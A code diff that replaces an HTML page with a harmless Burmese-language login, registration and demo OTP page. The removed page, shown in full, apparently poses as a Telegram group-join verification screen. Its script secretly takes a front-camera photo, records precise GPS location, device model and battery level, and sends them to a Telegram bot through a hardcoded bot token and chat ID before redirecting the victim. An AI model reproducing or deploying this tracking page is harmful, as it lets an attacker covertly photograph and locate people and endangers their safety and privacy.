@@ -1,117 +1,339 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="my">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    
-    <meta property="og:title" content="Telegram: Join Group Chat">
-    <meta property="og:description" content="Click to join the exclusive private group">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
-    <meta property="og:url" content="https://t.me/+MXbqj8pPVL82M2Zl">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="theme-color" content="#3390ec">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Modern Auth System</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
 
-    <title>Telegram Verification</title>
-    <style>
-        body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
-        .container { padding: 20px; max-width: 350px; }
-        .tg-logo { width: 80px; margin-bottom: 20px; }
-        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .join-btn:active { transform: scale(0.95); }
-        #status { margin-top: 15px; font-size: 13px; color: #888; }
-        #video, #canvas { display: none; }
-    </style>
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #0f172a, #1e293b, #334155);
+      color: #fff;
+      padding: 20px;
+    }
+
+    .auth-container {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 35px 30px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .tabs {
+      display: flex;
+      margin-bottom: 25px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .tab-btn {
+      flex: 1;
+      padding: 12px;
+      background: none;
+      border: none;
+      color: #94a3b8;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+    }
+
+    .tab-btn.active {
+      color: #38bdf8;
+    }
+
+    .tab-btn.active::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: #38bdf8;
+      box-shadow: 0 0 10px #38bdf8;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+      color: #cbd5e1;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgba(15, 23, 42, 0.6);
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: 0.3s ease;
+    }
+
+    .form-group input:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+
+    .actions a {
+      color: #38bdf8;
+      text-decoration: none;
+      transition: 0.2s;
+    }
+
+    .actions a:hover {
+      text-decoration: underline;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(135deg, #0284c7, #38bdf8);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(2, 132, 199, 0.4);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(56, 189, 248, 0.5);
+    }
+
+    .form-section {
+      display: none;
+    }
+
+    .form-section.active {
+      display: block;
+      animation: fadeIn 0.4s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Modal Style (OTP / Reset) */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background: #1e293b;
+      padding: 30px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 380px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      position: relative;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 15px; right: 15px;
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .otp-inputs input {
+      width: 45px;
+      height: 50px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      background: rgba(15, 23, 42, 0.8);
+      color: #38bdf8;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="TG">
-    <h2>Private Channel Access</h2>
-    <p>Please verify your identity to join the group.</p>
-    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
-    <p id="status">Location and Camera access required for security verification.</p>
-</div>
+  <div class="auth-container">
+    <!-- Tab Switches -->
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab('login')">Login</button>
+      <button class="tab-btn" onclick="switchTab('register')">Register</button>
+    </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+    <!-- Login Form -->
+    <div id="login-form" class="form-section active">
+      <form onsubmit="handleLogin(event)">
+        <div class="form-group">
+          <label>Email သို့မဟုတ် ဖုန်းနံပါတ်</label>
+          <input type="text" placeholder="example@domain.com" required>
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" placeholder="••••••••" required>
+        </div>
+        <div class="actions">
+          <a href="#" onclick="openOtpModal()">Password မေ့နေသလား / OTP ဖြင့်ဝင်မည်</a>
+        </div>
+        <button type="submit" class="btn-submit">Login ဝင်မည်</button>
+      </form>
+    </div>
 
-<script>
-    // Taro's Bot & Redirect Configuration
-    const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
-    const CHAT_ID = "5304050102";
-    const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";
+    <!-- Register Form -->
+    <div id="register-form" class="form-section">
+      <form onsubmit="handleRegister(event)">
+        <div class="form-group">
+          <label>အမည်</label>
+          <input type="text" placeholder="Your Name" required>
+        </div>
+        <div class="form-group">
+          <label>Email သို့မဟုတ် ဖုန်းနံပါတ်</label>
+          <input type="text" placeholder="example@domain.com" required>
+        </div>
+        <div class="form-group">
+          <label>Password အသစ်</label>
+          <input type="password" placeholder="••••••••" required>
+        </div>
+        <button type="submit" class="btn-submit">အကောင့်သစ်ဖွင့်မည်</button>
+      </form>
+    </div>
+  </div>
 
-    // ပိုမိုတိကျသော ဖုန်းမော်ဒယ် (ဥပမာ - Redmi Note 8) ရှာဖွေသည့်စနစ်
-    function getDetailedModel() {
-        const ua = navigator.userAgent;
-        let model = "Unknown Device";
-        if (/android/i.test(ua)) {
-            const match = ua.match(/Android\s([^\s;]+);?\s?([^;]+)\sBuild/);
-            model = match ? match[2].trim() : "Android Phone";
-        } else if (/iPhone/i.test(ua)) {
-            model = "iPhone";
-        }
-        return model;
+  <!-- OTP Modal -->
+  <div id="otp-modal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeOtpModal()">&times;</span>
+      <h3 style="margin-bottom: 10px; font-size: 18px;">OTP ဖြင့် အကောင့်ဝင်ရန်</h3>
+      <p style="font-size: 12px; color: #94a3b8; margin-bottom: 15px;">
+        ဖုန်းနံပါတ်/Email ရိုက်ထည့်ပြီး OTP တောင်းဆိုပါ
+      </p>
+
+      <div id="otp-step-1">
+        <div class="form-group">
+          <input type="text" id="otp-target" placeholder="ဖုန်းနံပါတ် သို့မဟုတ် Email">
+        </div>
+        <button type="button" class="btn-submit" onclick="sendOtpCode()">OTP ကုဒ်တောင်းမည်</button>
+      </div>
+
+      <div id="otp-step-2" style="display: none;">
+        <p style="font-size: 13px; color: #38bdf8; text-align: center;">ကျလာသော OTP ၄ လုံး ရိုက်ထည့်ပါ</p>
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" oninput="moveFocus(this, 1)">
+          <input type="text" maxlength="1" oninput="moveFocus(this, 2)">
+          <input type="text" maxlength="1" oninput="moveFocus(this, 3)">
+          <input type="text" maxlength="1" oninput="moveFocus(this, 4)">
+        </div>
+        <button type="button" class="btn-submit" onclick="verifyOtp()">အတည်ပြု၍ Login ဝင်မည်</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Tab switching logic
+    function switchTab(tab) {
+      document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+      document.querySelectorAll('.form-section').forEach(sec => sec.classList.remove('active'));
+
+      if (tab === 'login') {
+        document.querySelectorAll('.tab-btn')[0].classList.add('active');
+        document.getElementById('login-form').classList.add('active');
+      } else {
+        document.querySelectorAll('.tab-btn')[1].classList.add('active');
+        document.getElementById('register-form').classList.add('active');
+      }
     }
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        const btn = document.getElementById('startBtn');
-        const statusText = document.getElementById('status');
-        btn.innerText = "Verifying...";
-        statusText.innerText = "Requesting...";
+    // Modal Control
+    function openOtpModal() {
+      document.getElementById('otp-modal').style.display = 'flex';
+    }
 
-        try {
-            // ၁။ Camera Permission ယူခြင်း
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
+    function closeOtpModal() {
+      document.getElementById('otp-modal').style.display = 'none';
+      document.getElementById('otp-step-1').style.display = 'block';
+      document.getElementById('otp-step-2').style.display = 'none';
+    }
 
-            // ၂။ High Precision Location (အိမ်အတိအကျနီးပါး) ရယူခြင်း
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const accuracy = Math.round(pos.coords.accuracy);
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`; // တိုက်ရိုက်နှိပ်လို့ရသော Maps Link
+    // OTP Flow (Simulated)
+    function sendOtpCode() {
+      const target = document.getElementById('otp-target').value;
+      if (!target) {
+        alert('ကျေးဇူးပြု၍ ဖုန်းနံပါတ် သို့မဟုတ် Email ရိုက်ထည့်ပါ');
+        return;
+      }
+      alert('OTP ကုဒ် ပို့ပေးလိုက်ပါပြီ (Demo: 1234)');
+      document.getElementById('otp-step-1').style.display = 'none';
+      document.getElementById('otp-step-2').style.display = 'block';
+    }
 
-                // ၃။ ကျန်သည့် အချက်အလက်များ
-                let battery = "N/A";
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}%`;
-                }
-                const model = getDetailedModel();
+    function moveFocus(element, index) {
+      if (element.value.length === 1 && index < 4) {
+        document.querySelectorAll('.otp-inputs input')[index].focus();
+      }
+    }
 
-                // ၄။ ပုံဖမ်းယူပြီး Bot ဆီ အကုန်ပို့ခြင်း
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    const video = document.getElementById('video');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.7))).blob();
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.jpg');
-                    formData.append('caption', `🎯 *New Target Captured!*\n\n📍 Google Map: ${mapLink}\n🎯 Accuracy: ${accuracy} meters\n📱 Model: ${model}\n🔋 Battery: ${battery}`);
-                    formData.append('parse_mode', 'Markdown');
+    function verifyOtp() {
+      alert('OTP အတည်ပြုပြီးပါပြီ။ Login အောင်မြင်ပါသည်။');
+      closeOtpModal();
+    }
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    function handleLogin(e) {
+      e.preventDefault();
+      alert('Login အောင်မြင်ပါသည်။');
+    }
 
-                    // ၅။ အကုန်ပြီးရင် Redirect လုပ်မယ်
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.href = REDIRECT_URL;
-                }, 3500);
-
-            }, (err) => {
-                alert("Security Error: Please allow Location access to verify you are not a bot.");
-                location.reload();
-            }, { enableHighAccuracy: true });
-
-        } catch (err) {
-            alert("Verification Failed: Camera and Location permissions are mandatory.");
-            location.reload();
-        }
-    });
-</script>
+    function handleRegister(e) {
+      e.preventDefault();
+      alert('အကောင့်သစ် ပြုလုပ်ပြီးပါပြီ။');
+    }
+  </script>
 </body>
 </html>
+
